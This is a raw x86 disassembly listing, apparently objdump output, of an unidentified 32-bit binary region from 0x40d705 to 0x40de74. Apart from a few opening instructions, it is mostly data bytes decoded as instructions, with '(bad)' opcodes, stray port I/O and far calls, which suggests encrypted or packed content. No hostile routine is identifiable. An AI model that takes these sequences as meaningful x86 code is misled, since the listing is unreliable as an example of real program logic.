  40d705:	jne    0x40d129
  40d70b:	mov    ebx,esi
  40d70d:	jmp    0x40d717
  40d712:	mov    ebx,0x32729d
  40d717:	mov    eax,DWORD PTR [ebp-0x4]
  40d71a:	xor    eax,0x7510856
  40d71f:	add    eax,ebx
  40d721:	mov    DWORD PTR [ebp-0xc],eax
  40d724:	xor    ebx,ebx
  40d726:	lea    eax,[ebp-0x10]
  40d729:	add    ebx,DWORD PTR [eax]
  40d72b:	jmp    0x40d889
  40d730:	xchg   ebp,eax
  40d731:	pop    es
  40d732:	mov    ds:0xa5aabdfe,eax
  40d737:	cmp    eax,0xb6db83b1
  40d73c:	je     0x40d6ed
  40d73e:	add    al,0xa5
  40d740:	add    DWORD PTR [eax+0x7f3f7e7e],eax
  40d746:	jle    0x40d7c6
  40d748:	pop    edx
  40d749:	ret    
  40d74a:	or     edx,DWORD PTR [ecx+0x18aa9b9]
  40d750:	jns    0x40d6dc
  40d752:	(bad)  [edx+0x59ed0116]
  40d758:	aam    0x13
  40d75a:	push   ss
  40d75b:	cld    
  40d75c:	jb     0x40d7dc
  40d75e:	mov    esi,0x5731974e
  40d763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d764:	aaa    
  40d765:	or     eax,0x92381f81
  40d76a:	and    ch,cl
  40d76c:	(bad)  
  40d76d:	pop    edx
  40d76e:	rcr    BYTE PTR [edx-0x2e4e2822],cl
  40d774:	cmp    al,0xb9
  40d776:	pop    edi
  40d777:	(bad)  
  40d778:	aad    0xa3
  40d77a:	aaa    
  40d77b:	je     0x40d705
  40d77d:	cdq    
  40d77e:	into   
  40d77f:	cmp    eax,DWORD PTR [edx+edx*1]
  40d782:	adc    eax,0xbb29a75
  40d787:	sub    ch,BYTE PTR [edi]
  40d789:	dec    esi
  40d78a:	jmp    0x40e1:0x8625f8e2
  40d791:	jb     0x40d7b3
  40d793:	mov    bh,0x39
  40d795:	mov    ds:0x7442f903,eax
  40d79a:	rcr    DWORD PTR [eax+0x4e26a5e6],0x63
  40d7a1:	popf   
  40d7a2:	pop    ebp
  40d7a3:	fdiv   QWORD PTR [eax]
  40d7a5:	and    al,bh
  40d7a7:	out    0x9,eax
  40d7a9:	inc    eax
  40d7aa:	mov    dl,0x1
  40d7ac:	test   edi,0xb3b0e9e7
  40d7b2:	lahf   
  40d7b3:	sbb    DWORD PTR [ecx+0x22],esi
  40d7b6:	cmp    bl,ah
  40d7b8:	in     al,0xda
  40d7ba:	test   DWORD PTR [edi-0x41dbe669],esi
  40d7c0:	arpl   WORD PTR [edx-0x3d],bx
  40d7c3:	ins    DWORD PTR es:[edi],dx
  40d7c4:	stc    
  40d7c5:	xor    ah,BYTE PTR [esi]
  40d7c7:	fs dec ecx
  40d7c9:	out    dx,al
  40d7ca:	jnp    0x40d807
  40d7cc:	sbb    eax,0xf564423
  40d7d1:	fcomp  DWORD PTR [eax]
  40d7d3:	test   eax,0xe6439ec3
  40d7d8:	mov    bh,0x2c
  40d7da:	aas    
  40d7db:	pop    es
  40d7dc:	push   esi
  40d7dd:	in     al,0xf4
  40d7df:	and    ah,bh
  40d7e1:	mov    al,0xc1
  40d7e3:	push   edi
  40d7e4:	and    BYTE PTR [ebx-0x4aa14706],bh
  40d7ea:	adc    DWORD PTR [edi-0x75],ecx
  40d7ed:	mov    fs,WORD PTR [edi-0x6c]
  40d7f0:	rcr    BYTE PTR [ebx-0x60],0x9b
  40d7f4:	pop    esp
  40d7f5:	sub    bl,BYTE PTR [edx+edi*2+0x39]
  40d7f9:	add    eax,0xd71cb912
  40d7fe:	call   0xab997661
  40d803:	aas    
  40d804:	sti    
  40d805:	mov    BYTE PTR [esi-0x4c],ah
  40d808:	cdq    
  40d809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d80a:	or     esp,DWORD PTR [edi-0x16308550]
  40d810:	lea    esi,[edi-0x14]
  40d813:	add    DWORD PTR [ebx+0x44],ebx
  40d816:	out    0x60,eax
  40d818:	lock inc di
  40d81b:	xchg   ecx,eax
  40d81c:	adc    DWORD PTR [ecx],ebp
  40d81e:	outs   dx,DWORD PTR ds:[esi]
  40d81f:	jecxz  0x40d861
  40d821:	push   ebx
  40d822:	fcomip st,st(1)
  40d824:	mov    ds:0x6f188ee5,al
  40d829:	sahf   
  40d82a:	test   DWORD PTR [edx],eax
  40d82c:	jae    0x40d83d
  40d82e:	out    0x31,eax
  40d830:	ins    BYTE PTR es:[edi],dx
  40d831:	cmp    eax,0x5418b7b6
  40d836:	mov    al,ds:0x1dfa562d
  40d83b:	add    bh,BYTE PTR [ecx]
  40d83d:	sub    eax,0x2bcb9b0e
  40d842:	cld    
  40d843:	and    BYTE PTR [edi-0x50],al
  40d846:	mov    al,ds:0xa2d0b741
  40d84b:	mov    eax,ds:0x9c6989ff
  40d850:	mov    ch,0xce
  40d852:	test   al,0x7e
  40d854:	jg     0x40d84f
  40d856:	repz out dx,eax
  40d858:	repz inc edx
  40d85a:	jle    0x40d8b5
  40d85c:	das    
  40d85d:	dec    ebp
  40d85e:	leave  
  40d85f:	mov    ebx,0x2c612bc9
  40d864:	sbb    al,0x4
  40d866:	(bad)  
  40d867:	adc    BYTE PTR [ecx+eiz*2+0x74],cl
  40d86b:	xor    eax,ebp
  40d86d:	mov    ebp,0x397b08e4
  40d872:	lds    edx,FWORD PTR [edx+0x4f]
  40d875:	dec    edi
  40d876:	aad    0x70
  40d878:	mov    eax,0x9dc5a41f
  40d87d:	push   0x3f
  40d87f:	call   0xb268:0x7b882b1b
  40d886:	cwde   
  40d887:	stos   DWORD PTR es:[edi],eax
  40d888:	call   0x59e9:0xdb33d3ff
  40d88f:	add    DWORD PTR [eax],eax
  40d891:	add    dh,dh
  40d893:	arpl   WORD PTR [ebp+esi*2+0x7d97c57d],dx
  40d89a:	imul   eax,DWORD PTR [edx],0x51
  40d89d:	mov    ebx,DWORD PTR [esi+0x4d]
  40d8a0:	mov    esi,0x7e81c2e5
  40d8a5:	jle    0x40d8e6
  40d8a7:	jg     0x40d927
  40d8a9:	jle    0x40d82f
  40d8ab:	dec    ecx
  40d8ac:	xor    dh,BYTE PTR [esi+0x15]
  40d8af:	pop    edi
  40d8b0:	(bad)  
  40d8b1:	mov    bl,0xf4
  40d8b3:	(bad)  
  40d8b4:	(bad)  
  40d8b5:	fld    TBYTE PTR [ebx]
  40d8b7:	jae    0x40d887
  40d8b9:	mov    eax,0xd3343b30
  40d8be:	aad    0x14
  40d8c0:	out    dx,al
  40d8c1:	adc    al,0x35
  40d8c3:	adc    BYTE PTR cs:[ecx+0x79],al
  40d8c7:	lea    eax,[ecx+0x59472b1f]
  40d8cd:	and    al,0x81
  40d8cf:	dec    esi
  40d8d0:	or     BYTE PTR [esi+0x731e9877],dl
  40d8d6:	xchg   ebx,eax
  40d8d7:	sub    esp,esp
  40d8d9:	ret    0x3838
  40d8dc:	jecxz  0x40d906
  40d8de:	ror    DWORD PTR [ebp+eiz*4-0x35],cl
  40d8e2:	es jmp 0xf3af953b
  40d8e8:	stos   BYTE PTR es:[edi],al
  40d8e9:	push   0x68e1fc67
  40d8ee:	inc    edi
  40d8ef:	mov    ebx,0xdfa35252
  40d8f4:	fist   DWORD PTR [edi]
  40d8f6:	call   0x65c8a7dd
  40d8fb:	jno    0x40d907
  40d8fd:	sub    al,0x8d
  40d8ff:	jnp    0x40d901
  40d901:	jo     0x40d8fe
  40d903:	pop    ecx
  40d904:	or     dl,BYTE PTR [eax-0x7fcd3432]
  40d90a:	or     eax,0xe9d10cf2
  40d90f:	jge    0x40d960
  40d911:	in     eax,0x5
  40d913:	mov    dl,0xf5
  40d915:	inc    esp
  40d916:	inc    edx
  40d917:	lea    ebx,[edi+0x5e]
  40d91a:	int    0xcd
  40d91c:	arpl   WORD PTR [ebx+edx*1],bx
  40d91f:	fist   DWORD PTR [ebp-0x34]
  40d922:	or     edi,0xffffffb3
  40d925:	adc    edx,DWORD PTR [edi+0x9]
  40d928:	adc    ecx,DWORD PTR [ebp+0x100ef577]
  40d92e:	fdiv   st(5),st
  40d930:	sbb    edi,DWORD PTR [ebp+0x8]
  40d933:	jbe    0x40d977
  40d935:	and    ebp,DWORD PTR [eax+0x12]
  40d938:	pop    eax
  40d939:	out    0xaa,al
  40d93b:	jmp    0xf0a6:0x815dc9eb
  40d942:	(bad)  
  40d943:	xchg   esp,eax
  40d944:	dec    esp
  40d945:	fild   DWORD PTR [edx+eax*8]
  40d948:	mov    bh,0xc8
  40d94a:	les    ebp,FWORD PTR [eax]
  40d94c:	rcl    DWORD PTR [edx-0x228fdb60],1
  40d952:	cmp    eax,0xc658a69c
  40d957:	jmp    0xc1278c28
  40d95c:	sub    al,0xf0
  40d95e:	xor    BYTE PTR ds:0xa0b6b134,ah
  40d964:	popa   
  40d965:	pop    edx
  40d966:	push   esp
  40d967:	les    ecx,FWORD PTR [esi-0x2c59b77a]
  40d96d:	lds    esp,FWORD PTR [esi+0x27ba0315]
  40d973:	inc    ecx
  40d974:	lods   al,BYTE PTR ds:[esi]
  40d975:	cwde   
  40d976:	xchg   edx,eax
  40d977:	sbb    dl,BYTE PTR [eax-0x1387a9db]
  40d97d:	lock cli 
  40d97f:	shr    DWORD PTR [ebx],0x5
  40d982:	mov    esp,0x532a26b5
  40d987:	cld    
  40d988:	jno    0x40d964
  40d98a:	add    BYTE PTR [eax-0x4b8b40f],ah
  40d990:	fst    QWORD PTR [edx]
  40d992:	shl    DWORD PTR [edx-0x1f3ec6db],0x18
  40d999:	shl    BYTE PTR [esi+ebx*1+0x700d8c56],0x9
  40d9a1:	aas    
  40d9a2:	mov    bh,0xe7
  40d9a4:	bound  esi,QWORD PTR ds:0xaf7b0a1c
  40d9aa:	stos   DWORD PTR es:[edi],eax
  40d9ab:	xor    edx,DWORD PTR ds:0xa2e12f3a
  40d9b1:	sub    eax,0xe3225183
  40d9b6:	enter  0x228c,0xe1
  40d9ba:	add    DWORD PTR [ebx+0x54],ebp
  40d9bd:	sub    edx,ebx
  40d9bf:	adc    esi,edx
  40d9c1:	pop    ds
  40d9c2:	ss pop esp
  40d9c4:	test   BYTE PTR [ecx+edx*2],ah
  40d9c7:	lahf   
  40d9c8:	popf   
  40d9c9:	retf   0x523f
  40d9cc:	pop    ecx
  40d9cd:	out    0xd3,al
  40d9cf:	cwde   
  40d9d0:	sub    DWORD PTR [eax],edx
  40d9d2:	mov    ds:0xca41faad,eax
  40d9d7:	add    al,0x40
  40d9d9:	mov    ebx,0x4262334a
  40d9de:	retf   
  40d9df:	dec    edi
  40d9e0:	push   eax
  40d9e1:	mov    dh,0x24
  40d9e3:	jmp    0x40d9bc
  40d9e5:	push   ebp
  40d9e6:	clc    
  40d9e7:	push   ebx
  40d9e8:	xor    ebx,DWORD PTR [edi+0x12]
  40d9eb:	inc    ebx
  40d9ec:	jmp    0x40db4a
  40d9f1:	jae    0x40d9e7
  40d9f3:	aas    
  40d9f4:	mov    DWORD PTR [ecx-0x6573b2b3],esi
  40d9fa:	cmp    BYTE PTR [edx+0x77],bl
  40d9fd:	lods   al,BYTE PTR ds:[esi]
  40d9fe:	ss aaa 
  40da00:	push   edi
  40da01:	add    DWORD PTR [edx+0x7f3f7e7e],0x7e
  40da08:	jle    0x40da37
  40da0a:	or     al,0x98
  40da0c:	enter  0x4c69,0x0
  40da10:	outs   dx,DWORD PTR ds:[esi]
  40da11:	mov    DWORD PTR [esi],ebp
  40da13:	imul   edx,DWORD PTR [ebx+0x2eab0ce],0x7b
  40da1a:	sub    DWORD PTR [ecx+0x16],ebx
  40da1d:	(bad)  
  40da1e:	(bad)  [ebp-0x56]
  40da21:	jne    0x40da94
  40da23:	xor    dl,cl
  40da25:	cmp    dl,BYTE PTR [esi-0x32bb02a4]
  40da2b:	icebp  
  40da2c:	(bad)  
  40da2d:	nop
  40da2e:	enter  0xe405,0x63
  40da32:	push   edx
  40da33:	mov    bl,0x49
  40da35:	and    dh,bl
  40da37:	int    0x12
  40da39:	je     0x40dab3
  40da3b:	xchg   esp,eax
  40da3c:	data16 jne 0x40da55
  40da3f:	jmp    0x40da2e
  40da41:	push   ecx
  40da42:	or     al,0x3d
  40da44:	jle    0x40daaf
  40da46:	sub    eax,ecx
  40da48:	mov    es,WORD PTR [edx-0x140eed31]
  40da4e:	adc    BYTE PTR [edi],dl
  40da50:	pop    edi
  40da51:	cmp    eax,edx
  40da53:	pop    eax
  40da54:	add    al,0x7d
  40da56:	aaa    
  40da57:	mov    dh,0x3e
  40da59:	dec    edx
  40da5a:	jmp    0x6ed75595
  40da5f:	inc    edx
  40da60:	mov    eax,0xa5938afc
  40da65:	leave  
  40da66:	icebp  
  40da67:	add    eax,DWORD PTR [ecx+0x38c1360d]
  40da6d:	repz or eax,DWORD PTR [ecx+0x5f]
  40da71:	mov    ds:0x87d07383,eax
  40da76:	xchg   ebx,eax
  40da77:	cmp    DWORD PTR [esi],esi
  40da79:	retf   
  40da7a:	dec    edx
  40da7b:	cs cld 
  40da7d:	cdq    
  40da7e:	xlat   BYTE PTR ds:[ebx]
  40da7f:	jno    0x40da73
  40da81:	push   ebp
  40da82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da83:	lds    esp,FWORD PTR [ecx+ebp*8]
  40da86:	xchg   edi,eax
  40da87:	cwde   
  40da88:	fdiv   QWORD PTR [ebp+0x38eafdb8]
  40da8e:	push   0x33
  40da90:	xor    ah,BYTE PTR [ecx]
  40da92:	inc    eax
  40da93:	jge    0x40daae
  40da95:	out    dx,al
  40da96:	push   ds
  40da97:	mov    ch,0xda
  40da99:	popf   
  40da9a:	xchg   edi,eax
  40da9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da9c:	shl    DWORD PTR [ebp-0x40c4f536],0x9f
  40daa3:	or     bl,BYTE PTR [ebp-0x5a]
  40daa6:	inc    ecx
  40daa7:	mov    ds:0xa9eaa96f,al
  40daac:	adc    dl,BYTE PTR [eax-0x65]
  40daaf:	fidiv  DWORD PTR [ebx]
  40dab1:	rcr    BYTE PTR [ebx],1
  40dab3:	cld    
  40dab4:	add    al,0x40
  40dab6:	and    BYTE PTR [eax],al
  40dab8:	push   ecx
  40dab9:	repz jno 0x40db28
  40dabc:	dec    eax
  40dabd:	pop    ebx
  40dabe:	fst    QWORD PTR [edi+eiz*2+0x3b]
  40dac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dac3:	add    eax,0x64f1b40c
  40dac8:	push   0xffffffd1
  40daca:	dec    ecx
  40dacb:	rcl    BYTE PTR [eax-0x5f],0xae
  40dacf:	aaa    
  40dad0:	inc    esi
  40dad1:	and    esp,ebx
  40dad3:	push   edi
  40dad4:	xchg   edi,eax
  40dad5:	and    DWORD PTR [ebp-0x4f],esp
  40dad8:	jmp    0x40db18
  40dada:	call   0xf96c:0xa7575d24
  40dae1:	adc    cl,BYTE PTR [ecx-0xdef9c60]
  40dae7:	mov    ah,0xc7
  40dae9:	push   esp
  40daea:	xor    eax,0x959ec5c9
  40daef:	cmp    eax,0x5530bbc6
  40daf4:	mov    cs,ebp
  40daf6:	jne    0x40db66
  40daf8:	add    DWORD PTR [esi-0x4],edi
  40dafb:	inc    edx
  40dafc:	fdiv   st,st(0)
  40dafe:	cmp    DWORD PTR [esi],edi
  40db00:	mov    dh,0xa6
  40db02:	xor    edx,DWORD PTR [edx]
  40db04:	dec    edx
  40db05:	(bad)  
  40db06:	in     al,dx
  40db07:	imul   eax,DWORD PTR [edx],0x63efedb7
  40db0d:	mov    ebp,edx
  40db0f:	loope  0x40da91
  40db11:	cmp    BYTE PTR [eax],dl
  40db13:	and    ebp,DWORD PTR cs:[ecx-0x54]
  40db17:	out    dx,eax
  40db18:	fdivr  st,st(5)
  40db1a:	or     edi,DWORD PTR [edi+edi*8+0x67]
  40db1e:	mov    esp,0xed52d59c
  40db23:	jle    0x40daf6
  40db25:	(bad)  
  40db27:	jnp    0x40db73
  40db29:	mov    bl,bl
  40db2b:	lahf   
  40db2c:	aam    0x1b
  40db2e:	xchg   esi,eax
  40db2f:	clc    
  40db30:	(bad)  
  40db31:	in     al,0x43
  40db33:	adc    BYTE PTR [eax-0x69],ch
  40db36:	jge    0x40db1a
  40db38:	sbb    al,0x12
  40db3a:	popa   
  40db3b:	mov    ebp,DWORD PTR [ebp+0x65]
  40db3e:	xchg   ecx,eax
  40db3f:	ficomp WORD PTR [ecx]
  40db41:	push   0x4a4b06fb
  40db46:	leave  
  40db47:	dec    ebp
  40db48:	dec    ecx
  40db49:	ret    
  40db4a:	cmp    DWORD PTR [ebp+0x10],ebx
  40db4d:	je     0x40df85
  40db53:	jmp    0x40dcb1
  40db58:	xchg   ebp,eax
  40db59:	mov    BYTE PTR [esi-0x42c354e4],bl
  40db5f:	mov    ecx,0xd105ab5
  40db64:	cs cli 
  40db66:	lods   al,BYTE PTR ds:[esi]
  40db67:	int    0x44
  40db69:	cmp    DWORD PTR [esi+0x7e],0x3f
  40db6d:	jg     0x40dbed
  40db6f:	jle    0x40db3f
  40db71:	adc    BYTE PTR [edi+0x53],al
  40db74:	repnz push edx
  40db76:	pop    ecx
  40db77:	in     eax,0x52
  40db79:	push   cs
  40db7a:	push   edx
  40db7b:	dec    edx
  40db7c:	retf   
  40db7d:	mov    WORD PTR [eax+ebx*4],gs
  40db80:	out    dx,al
  40db81:	lea    edi,[ebx-0xc]
  40db84:	in     eax,dx
  40db85:	pop    ebp
  40db86:	push   0x7d
  40db88:	mov    ch,0x56
  40db8a:	cs in  eax,dx
  40db8c:	dec    edx
  40db8d:	push   0xdfedd6c6
  40db92:	jmp    0x3ed539df
  40db97:	add    BYTE PTR [ebp-0x39fa2b9f],bl
  40db9d:	mov    ch,0x22
  40db9f:	ja     0x40dc0c
  40dba1:	mov    DWORD PTR [ebx-0x42e73318],esi
  40dba7:	and    BYTE PTR [esi+0x7a5fe8ce],ch
  40dbad:	psllq  mm1,QWORD PTR [ebx]
  40dbb0:	add    bl,BYTE PTR [ebx]
  40dbb2:	pop    esp
  40dbb3:	inc    esi
  40dbb4:	mov    ch,0x6
  40dbb6:	int    0xdc
  40dbb8:	push   0x66caafba
  40dbbd:	inc    BYTE PTR [ecx-0x4d]
  40dbc0:	sbb    eax,0xb076ab1
  40dbc5:	outs   dx,DWORD PTR ds:[esi]
  40dbc6:	push   esp
  40dbc7:	mov    bh,0x9
  40dbc9:	jp     0x40dbe8
  40dbcb:	mov    bh,0xb
  40dbcd:	inc    edi
  40dbce:	pop    edx
  40dbcf:	sbb    DWORD PTR [ebx],ebx
  40dbd1:	stos   DWORD PTR es:[edi],eax
  40dbd2:	ins    DWORD PTR es:[edi],dx
  40dbd3:	dec    ecx
  40dbd4:	mov    eax,DWORD PTR [edx-0x6e]
  40dbd7:	aam    0x6a
  40dbd9:	loop   0x40dbb1
  40dbdb:	enter  0x4a04,0x7d
  40dbdf:	add    eax,0xbccba366
  40dbe4:	sbb    DWORD PTR [edx],0x10b58e3f
  40dbea:	sbb    BYTE PTR [edi-0x74ce161c],al
  40dbf0:	and    ch,ch
  40dbf2:	push   ss
  40dbf3:	xor    al,0x31
  40dbf5:	inc    esp
  40dbf6:	push   es
  40dbf7:	xchg   ebx,eax
  40dbf8:	sub    eax,0x152da5bd
  40dbfd:	cmp    ebx,ebp
  40dbff:	lds    esi,FWORD PTR [edx-0x3f]
  40dc02:	out    dx,al
  40dc03:	rcr    DWORD PTR [eax-0x25],cl
  40dc06:	xchg   esp,eax
  40dc07:	cmp    eax,0x26e7f9ab
  40dc0c:	push   0x16
  40dc0e:	mov    bh,0x90
  40dc10:	into   
  40dc11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc12:	test   DWORD PTR [eax],edx
  40dc14:	mov    edi,0x2b7e80c0
  40dc19:	and    DWORD PTR [ecx+ebx*8+0x52],esi
  40dc1d:	adc    al,0x96
  40dc1f:	frstor [ecx]
  40dc21:	mov    esi,0xe9b1c947
  40dc26:	xchg   edi,eax
  40dc27:	adc    ah,BYTE PTR [esi+edx*2-0x6ce8c10d]
  40dc2e:	cmp    al,0x3d
  40dc30:	xchg   ebp,eax
  40dc31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc32:	or     DWORD PTR [edx],0x7b
  40dc35:	pop    fs
  40dc37:	ja     0x40dc92
  40dc39:	push   ss
  40dc3a:	adc    eax,0x17aa2626
  40dc3f:	je     0x40dbf2
  40dc41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc42:	pop    ecx
  40dc43:	pop    es
  40dc44:	test   eax,0x86bd02cd
  40dc49:	fild   DWORD PTR [edx+0x3c5ec749]
  40dc4f:	addr16 mov esi,0xff293f4b
  40dc55:	xchg   ecx,eax
  40dc56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc57:	mul    BYTE PTR [esi+0x2a]
  40dc5a:	mov    al,ds:0xd118315e
  40dc5f:	fcomp  QWORD PTR [edx]
  40dc61:	lahf   
  40dc62:	cmp    al,0x7e
  40dc64:	stos   DWORD PTR es:[edi],eax
  40dc65:	and    ecx,edi
  40dc67:	(bad)  
  40dc68:	jecxz  0x40dce1
  40dc6a:	fidiv  DWORD PTR [edi-0x4cc2b88d]
  40dc70:	sti    
  40dc71:	repz mov esi,DWORD PTR [ebx]
  40dc74:	call   0x400:0xc8fd3f29
  40dc7b:	jno    0x40dc11
  40dc7d:	adc    esi,DWORD PTR [esi+0x2]
  40dc80:	mov    DWORD PTR [ebp-0x52590cdc],esi
  40dc86:	xor    eax,0x2691aa68
  40dc8b:	in     eax,0x77
  40dc8d:	xchg   ecx,eax
  40dc8e:	rol    BYTE PTR [eax+0x59],cl
  40dc91:	aaa    
  40dc92:	push   ebx
  40dc93:	outs   dx,BYTE PTR ds:[esi]
  40dc94:	inc    al
  40dc96:	div    DWORD PTR [ecx+0x0]
  40dc99:	bound  edi,QWORD PTR [esp+ecx*1]
  40dc9c:	scas   eax,DWORD PTR es:[edi]
  40dc9d:	std    
  40dc9e:	and    bh,BYTE PTR [ebx-0x608bb090]
  40dca4:	push   es
  40dca5:	sbb    BYTE PTR [ecx+edi*2],bh
  40dca8:	push   esi
  40dca9:	xor    edx,ebp
  40dcab:	mov    esp,0xb653c636
  40dcb0:	sbb    edx,DWORD PTR [edx+0x159e9]
  40dcb6:	add    BYTE PTR [eax+0x15],cl
  40dcb9:	sti    
  40dcba:	retf   0xdc7b
  40dcbd:	jns    0x40dc54
  40dcbf:	rcl    BYTE PTR ds:0x5fa23fe9,cl
  40dcc5:	call   0x7ec5e229
  40dcca:	jle    0x40dd0b
  40dccc:	jg     0x40dd4c
  40dcce:	jle    0x40dceb
  40dcd0:	xchg   edi,eax
  40dcd1:	adc    al,0xe4
  40dcd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd4:	fadd   st,st(1)
  40dcd6:	test   al,dh
  40dcd8:	sub    DWORD PTR [edx+0x49],edi
  40dcdb:	xchg   esp,eax
  40dcdc:	sub    BYTE PTR [eax+0x4f],al
  40dcdf:	jne    0x40dd4c
  40dce1:	jmp    0x98ad:0xe5729cde
  40dce8:	jmp    0x40dc8e
  40dcea:	jo     0x40dd42
  40dcec:	xchg   esp,eax
  40dced:	sti    
  40dcee:	scas   eax,DWORD PTR es:[edi]
  40dcef:	mov    dl,0xab
  40dcf1:	add    eax,ebp
  40dcf3:	fcmovu st,st(1)
  40dcf5:	lea    esi,[ebp+0x2b]
  40dcf8:	pop    ebx
  40dcf9:	inc    esi
  40dcfa:	mov    ds:0xf03e4afc,eax
  40dcff:	jecxz  0x40dd22
  40dd01:	pop    edx
  40dd02:	inc    esi
  40dd03:	out    dx,eax
  40dd04:	adc    al,0xf4
  40dd06:	in     eax,dx
  40dd07:	mov    bl,0x94
  40dd09:	xchg   ebp,eax
  40dd0a:	inc    edi
  40dd0b:	call   0x3416:0xff9baaff
  40dd12:	xchg   BYTE PTR [esi-0x40],dl
  40dd15:	cmp    ch,BYTE PTR [edx+0x76]
  40dd18:	int    0x6e
  40dd1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd1b:	mov    BYTE PTR [ebx+eax*4+0x61],ah
  40dd1f:	pop    ebp
  40dd20:	das    
  40dd21:	sub    edi,edi
  40dd23:	in     al,0x5f
  40dd25:	mov    cs,WORD PTR [ebx+edx*2]
  40dd28:	xlat   BYTE PTR ds:[ebx]
  40dd29:	mov    edi,0xca8c9417
  40dd2e:	cmp    al,0x78
  40dd30:	xor    ah,BYTE PTR [ebp-0x112b49fe]
  40dd36:	das    
  40dd37:	sahf   
  40dd38:	sbb    BYTE PTR [esi+edi*1],0x74
  40dd3c:	std    
  40dd3d:	dec    edx
  40dd3e:	cmp    ecx,DWORD PTR [esi]
  40dd40:	mov    ds:0xa0fe86c2,al
  40dd45:	fisub  WORD PTR [ebx]
  40dd47:	sbb    eax,0x684a3554
  40dd4c:	add    ebx,DWORD PTR [edi-0x47]
  40dd4f:	jecxz  0x40dcd9
  40dd51:	xor    DWORD PTR [ecx+0x3a],0x163f2255
  40dd58:	mov    esp,0xe55baa9c
  40dd5d:	inc    esp
  40dd5e:	jle    0x40dd78
  40dd60:	or     DWORD PTR [ecx+0x62],esi
  40dd63:	shl    DWORD PTR [edi],cl
  40dd65:	jecxz  0x40ddb9
  40dd67:	and    DWORD PTR [ebx+ebp*4-0x3f],ecx
  40dd6b:	dec    edx
  40dd6c:	xor    ecx,edx
  40dd6e:	inc    edx
  40dd6f:	add    al,0xb4
  40dd71:	into   
  40dd72:	in     eax,dx
  40dd73:	inc    eax
  40dd74:	jmp    0x40ddd7
  40dd76:	mov    bl,0xce
  40dd78:	loop   0x40ddd8
  40dd7a:	ret    0x24c0
  40dd7d:	test   DWORD PTR [edi+0xa],ebp
  40dd80:	outs   dx,BYTE PTR ds:[esi]
  40dd81:	mov    ds:0x4a72213a,al
  40dd86:	in     eax,0x88
  40dd88:	xchg   ecx,eax
  40dd89:	jmp    0x40ddf8
  40dd8b:	inc    ebx
  40dd8c:	loope  0x40dd64
  40dd8e:	daa    
  40dd8f:	mov    ebp,db5
  40dd92:	adc    al,0x15
  40dd94:	cmp    eax,0xa4a3a426
  40dd99:	aaa    
  40dd9a:	adc    BYTE PTR [eax+0x14f8f246],ah
  40dda0:	ds push 0x63
  40dda3:	xchg   BYTE PTR [esi+ebp*4+0x62a79f88],cl
  40ddaa:	scas   eax,DWORD PTR es:[edi]
  40ddab:	sub    BYTE PTR [edx+0x27],bl
  40ddae:	push   es
  40ddaf:	arpl   WORD PTR [esi],bx
  40ddb1:	xchg   ebx,eax
  40ddb2:	das    
  40ddb3:	fsub   DWORD PTR [edx]
  40ddb5:	es aaa 
  40ddb7:	js     0x40dd60
  40ddb9:	jbe    0x40dde7
  40ddbb:	xchg   esp,eax
  40ddbc:	jmp    0x40de20
  40ddbe:	cmp    DWORD PTR [eax+0x28d775f0],edx
  40ddc4:	cmp    edx,DWORD PTR [ecx+0x53]
  40ddc7:	pushf  
  40ddc8:	bound  esp,QWORD PTR [esi]
  40ddca:	push   0xc
  40ddcc:	ins    BYTE PTR es:[edi],dx
  40ddcd:	jne    0x40de20
  40ddcf:	inc    esi
  40ddd0:	cmp    BYTE PTR [esi+0x10],dh
  40ddd3:	pop    ebp
  40ddd4:	sbb    eax,0xbdea0d63
  40ddd9:	push   esp
  40ddda:	add    al,0x28
  40dddc:	ins    DWORD PTR es:[edi],dx
  40dddd:	or     DWORD PTR [ebx-0x21],edx
  40dde0:	jns    0x40ddef
  40dde2:	mov    al,BYTE PTR [eax]
  40dde4:	loopne 0x40dde4
  40dde6:	jg     0x40dd73
  40dde8:	iret   
  40dde9:	jg     0x40ddd5
  40ddeb:	pop    es
  40ddec:	mov    ah,0xc0
  40ddee:	push   ebx
  40ddef:	dec    esi
  40ddf0:	mov    DWORD PTR [esi+eax*1+0x10e18ee9],eax
  40ddf7:	aam    0x64
  40ddf9:	mov    eax,0x774223e7
  40ddfe:	popf   
  40ddff:	xchg   edi,eax
  40de00:	fbstp  TBYTE PTR [edx]
  40de02:	mov    gs,WORD PTR [eax+eiz*2+0x7a]
  40de06:	add    DWORD PTR [edx+0x4b687b45],ebp
  40de0c:	sbb    cl,BYTE PTR [esi+0xa6a5b42]
  40de12:	pop    ecx
  40de13:	push   0x4
  40de15:	pop    ebx
  40de16:	inc    ebx
  40de17:	xchg   ebx,ecx
  40de19:	jmp    0x40df77
  40de1e:	ss test al,0xe0
  40de21:	or     eax,0x6dfb5d60
  40de26:	mov    al,0x7d
  40de28:	jmp    0x8f7bb78d
  40de2d:	cmp    eax,0x7e7e86c6
  40de32:	aas    
  40de33:	jg     0x40deb3
  40de35:	jle    0x40de85
  40de37:	je     0x40de1a
  40de39:	add    cl,0x1a
  40de3c:	outs   dx,BYTE PTR ds:[esi]
  40de3d:	les    eax,FWORD PTR [ebx]
  40de3f:	test   bh,bl
  40de41:	mov    dl,dh
  40de43:	lds    ecx,FWORD PTR [esi+0x3aeeee1c]
  40de49:	inc    edx
  40de4a:	dec    esp
  40de4b:	test   eax,0xba2638fd
  40de50:	sub    BYTE PTR [ebx+0x4c],bl
  40de53:	shl    BYTE PTR [eax],0x6
  40de56:	mov    edx,0xbf0c9b0a
  40de5b:	aam    0x2d
  40de5d:	imul   ebp,DWORD PTR [ebx+0x2c],0x67
  40de61:	jns    0x40de19
  40de63:	and    DWORD PTR [eax+0x5532e5f0],esp
  40de69:	inc    eax
  40de6a:	sbb    al,0x3c
  40de6c:	xchg   ecx,esp
  40de6e:	(bad)  
  40de70:	enter  0x3225,0x5a
  40de74:	mov    DWORD PTR ds:0x921dc06d,esp
